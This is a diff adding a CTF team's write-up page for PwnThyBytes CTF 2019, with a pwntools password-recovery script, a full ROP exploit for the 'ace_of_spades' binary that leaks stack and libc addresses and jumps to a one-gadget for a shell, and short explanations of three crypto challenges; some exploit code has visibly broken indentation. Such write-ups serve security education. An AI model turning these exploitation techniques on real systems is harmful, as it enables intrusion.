@@ -1,0 +1,442 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>PwnThyBytes CTF 2019</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                warmup/learning
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#pass_the_hash">pass_the_hash</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                memory-corruption
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#ace-of-spades">ace-of-spades</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#wrong-ring">wrong-ring</a>
+    
+                <a class="dropdown-item" href="#avec">avec</a>
+    
+                <a class="dropdown-item" href="#lotr">lotr</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">warmup/learning</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#pass_the_hash" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pass_the_hash</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">memory-corruption</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#ace-of-spades" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ace-of-spades</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#wrong-ring" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">wrong-ring</span>
+            </a>
+    
+<a href="#avec" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">avec</span>
+            </a>
+    
+<a href="#lotr" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">lotr</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="pwnthybytes-ctf-2019"><a class="header-link" href="#pwnthybytes-ctf-2019"></a>PwnThyBytes CTF 2019</h1>
+
+<h2 id="warmup/learning"><a class="header-link" href="#warmup/learning"></a>Warmup/Learning</h2>
+<h3 id="pass_the_hash"><a class="header-link" href="#pass_the_hash"></a>pass_the_hash</h3>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> hashlib
+
+host, port = <span class="hljs-string">'52.142.217.130'</span>, <span class="hljs-number">13374</span>
+
+p_head_ans, p_tail_ans = <span class="hljs-string">''</span>, <span class="hljs-string">''</span>
+p_head_l, p_tail_l = [], []
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send</span><span class="hljs-params">(r)</span>:</span>
+    <span class="hljs-keyword">global</span> p_head_ans, p_tail_ans, p_head_l, p_tail_l
+    salt_1 = os.urandom(<span class="hljs-number">11</span>) + <span class="hljs-string">'\x00'</span>
+    salt_2 = <span class="hljs-string">'\x00'</span> + os.urandom(<span class="hljs-number">11</span>)
+    salt = salt_1 + salt_2
+    r.sendline(salt.encode(<span class="hljs-string">'hex'</span>))
+
+    h = r.recvline()[:<span class="hljs-number">-1</span>].decode(<span class="hljs-string">'hex'</span>)
+    l_pass, r_pass = h[:<span class="hljs-number">32</span>], h[<span class="hljs-number">32</span>:]
+    p_head = xor(xor(l_pass[<span class="hljs-number">-12</span>:], salt_1), l_pass[:<span class="hljs-number">12</span>])
+    p_tail = xor(xor(r_pass[:<span class="hljs-number">12</span>], salt_2), r_pass[<span class="hljs-number">-12</span>:])
+
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> p_head_ans:
+        <span class="hljs-keyword">if</span> p_head <span class="hljs-keyword">in</span> p_head_l:
+            print(<span class="hljs-string">'found p_head'</span>)
+            print(p_head)
+            p_head_ans = p_head
+        <span class="hljs-keyword">else</span>:
+            p_head_l.append(p_head)
+
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> p_tail_ans:
+        <span class="hljs-keyword">if</span> p_tail <span class="hljs-keyword">in</span> p_tail_l:
+            print(<span class="hljs-string">'found p_tail'</span>)
+            print(p_tail)
+            p_tail_ans = p_tail
+        <span class="hljs-keyword">else</span>:
+            p_tail_l.append(p_tail)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
+    r = remote(host, port)
+    r.recvline()
+
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1024</span>):
+        <span class="hljs-keyword">if</span> p_head_ans <span class="hljs-keyword">and</span> p_tail_ans:
+            <span class="hljs-keyword">break</span>
+        print(i)
+        send(r)
+
+    r.sendline(<span class="hljs-string">''</span>)
+    r.recvline()
+    salt = r.recvline()[:<span class="hljs-number">-1</span>].decode(<span class="hljs-string">'hex'</span>)
+    password = p_head_ans + p_tail_ans[<span class="hljs-number">-8</span>:]
+
+    no_rounds = <span class="hljs-number">16</span>
+    h_list = [sha, sha1, ripemd160, sha256]
+    ans = combo_hash(salt, password, h_list, no_rounds).encode(<span class="hljs-string">'hex'</span>)
+    r.sendline(ans)
+    r.interactive()
+
+main()
+<span class="hljs-comment"># PTBCTF{420199e572e685af8e1782fde58fd0e9}</span></code></pre><h2 id="memory-corruption"><a class="header-link" href="#memory-corruption"></a>Memory Corruption</h2>
+<h3 id="ace-of-spades"><a class="header-link" href="#ace-of-spades"></a>ace of spades</h3>
+<p>x86 32bit efl, strcpy has vulnerabilty when the src and dest are overlaping.
+duplicating ace of spades, make play point be 16000.</p>
+<p>Then, overwrite the rbp and ret addr, ROP attack.</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+
+
+<span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">1</span>:
+    r = remote(<span class="hljs-string">'137.117.216.128'</span>, <span class="hljs-number">13375</span>)
+<span class="hljs-keyword">else</span>:
+    r = process(<span class="hljs-string">'./ace_of_spades'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">draw</span><span class="hljs-params">()</span>:</span>
+    r.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'1'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">discard</span><span class="hljs-params">()</span>:</span>
+    r.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'2'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">play</span><span class="hljs-params">()</span>:</span>
+    r.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'3'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>
+    r.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'4'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fold</span><span class="hljs-params">()</span>:</span>
+    r.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'5'</span>)
+
+<span class="hljs-comment">#for i in range(29):</span>
+<span class="hljs-comment">#    draw()</span>
+
+target1 = <span class="hljs-number">0x81839ff0</span>
+target2 = <span class="hljs-number">0xa1829ff0</span> 
+target3 = <span class="hljs-number">0xbe829ff0</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_leak</span><span class="hljs-params">()</span>:</span>
+    show()
+    r.recvuntil(<span class="hljs-string">'hand is:\n'</span>)
+    r.recvn(<span class="hljs-number">5</span>*<span class="hljs-number">22</span>)
+        val = u32(r.recvn(<span class="hljs-number">5</span>)[<span class="hljs-number">1</span>:]) 
+    <span class="hljs-keyword">if</span> val == target1 <span class="hljs-keyword">or</span> val == target2 <span class="hljs-keyword">or</span> val == target3:
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
+    <span class="hljs-keyword">return</span> u32(r.recvn(<span class="hljs-number">4</span>)) 
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">duplicate</span><span class="hljs-params">(target)</span>:</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">24</span>):
+        draw()
+    <span class="hljs-keyword">if</span> target == get_leak():
+            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):
+                draw()
+            discard()
+            <span class="hljs-keyword">return</span>
+        <span class="hljs-keyword">else</span>:
+            fold()
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
+   print(<span class="hljs-string">'magic'</span>, i)
+   duplicate(<span class="hljs-number">0xa1829ff0</span>)
+   fold()
+
+<span class="hljs-string">"""
+for i in range(10):
+   print('t1', i)
+   duplicate(0x81839ff0)
+   fold()
+
+for i in range(10):
+   print('t3', i)
+   duplicate(target3)
+   fold()
+"""</span>
+
+print(<span class="hljs-string">"done"</span>)
+
+
+<span class="hljs-comment">#r.interactive()</span>
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):
+        draw()
+
+    play()
+    r.recvuntil(<span class="hljs-string">'points: '</span>)
+    point = int(r.recvline()[:<span class="hljs-number">-1</span>])
+    print(<span class="hljs-string">'hello'</span>, point)
+    <span class="hljs-keyword">if</span> point &gt;= <span class="hljs-number">16000</span> <span class="hljs-keyword">and</span> point &lt; <span class="hljs-number">17000</span>:
+        r.recvuntil(<span class="hljs-string">'prize: '</span>)
+    stack = u32(r.recvn(<span class="hljs-number">4</span>))<span class="hljs-number">-0x10</span>
+    code = u32(r.recvn(<span class="hljs-number">4</span>))<span class="hljs-number">-0x1355</span>
+    <span class="hljs-keyword">print</span> hex(stack)
+    <span class="hljs-keyword">print</span> hex(code)
+
+    payload = flat(
+    <span class="hljs-number">0x1234</span>,
+    code+<span class="hljs-number">0x638</span>,<span class="hljs-number">0x1234</span>,<span class="hljs-number">0</span>,stack,<span class="hljs-number">0x100</span>
+    )
+
+    r.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"2"</span>)
+    r.send(payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">"\x00"</span>))
+
+    r.sendlineafter(<span class="hljs-string">": "</span>,<span class="hljs-string">"6"</span>)
+
+    payload = flat(
+    code+<span class="hljs-number">0x0619</span>,code+<span class="hljs-number">0x2f98</span>,code+<span class="hljs-number">0x668</span>,code+<span class="hljs-number">0x0619</span>,code+<span class="hljs-number">0x02fb0</span>,
+    code+<span class="hljs-number">0x0619</span>,code+<span class="hljs-number">0x2f98</span>,code+<span class="hljs-number">0x638</span>,<span class="hljs-number">0x1234</span>,<span class="hljs-number">0</span>,stack+<span class="hljs-number">0x18</span>,<span class="hljs-number">0x100</span>
+    )
+
+    r.send(payload.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">"\x00"</span>).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">"\x00"</span>))
+    libc = u32(r.recvn(<span class="hljs-number">4</span>))<span class="hljs-number">-0x49670</span>
+    <span class="hljs-keyword">print</span> hex(libc)
+    r.send(p32(libc+<span class="hljs-number">0x3ac62</span>).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">"\x00"</span>))
+
+    r.interactive()
+
+    <span class="hljs-keyword">elif</span> point &gt;= <span class="hljs-number">1000</span>:
+        r.sendlineafter(<span class="hljs-string">'Choose: '</span>, <span class="hljs-string">'1'</span>)     
+
+    fold()
+
+r.interactive()
+</code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="wrong-ring"><a class="header-link" href="#wrong-ring"></a>Wrong ring</h3>
+<p>Those coefficients of high degree error terms are very small(less than 0.5).
+So just take those high degree terms from each result and solve some linear equations to get the flag</p>
+<h3 id="avec"><a class="header-link" href="#avec"></a>Avec</h3>
+<p>The keyspace is only 32bits:</p>
+<pre class="hljs"><code><span class="hljs-symbol">sage:</span> (<span class="hljs-number">2</span>**<span class="hljs-number">64</span> - <span class="hljs-number">1</span>) / <span class="hljs-number">0xbcafffff435</span>
+<span class="hljs-number">4294967297</span>/<span class="hljs-number">3019</span></code></pre><p>So it is feasible to bruteforce the key.</p>
+<p>However, we also need its nonce to decrypt our flag. To recover nonce, we need to know how GCM works.
+In GCM mode, plaintext is encrypted using CTR mode, and then we calculate a hash of all ciphertext &amp; auth data &amp; length.
+After that, we generate authentication tag by XOR the hash with first block of CTR keystream.</p>
+<p>We can calculate the hash without nonce, so we can recover the first keystream block by xor the hash with final tag.
+And the plaintext of first block is nonce.</p>
+<h3 id="lotr"><a class="header-link" href="#lotr"></a>LOTR</h3>
+<p>The signature is 243 ciphertext of RSA, and the way they verify it is decrypting them with a public key, xor together, and check whether they are equal to the hash.
+It&#39;s is not possible to forge the plaintext without secret key, but we can select which plaintext to xor.
+To solve this task, I generate a pair of ciphertext randomly for each RSA key, and solve a GF2 linear equations to decide which one to use.</p>
+<pre class="hljs"><code>      [plain1_A <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> ... <span class="hljs-number">0</span>]
+      [plain1_B <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> ... <span class="hljs-number">0</span>]
+      [plain2_A <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> ... <span class="hljs-number">0</span>]
+?  X  [plain2_B <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> ... <span class="hljs-number">0</span>]  =  [result <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> ... <span class="hljs-number">1</span>]
+      ...
+      [plainN_A <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> ... <span class="hljs-number">1</span>]
+      [plainN_B <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> ... <span class="hljs-number">1</span>]</code></pre><p>If the equation has no solution, just generate another one.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
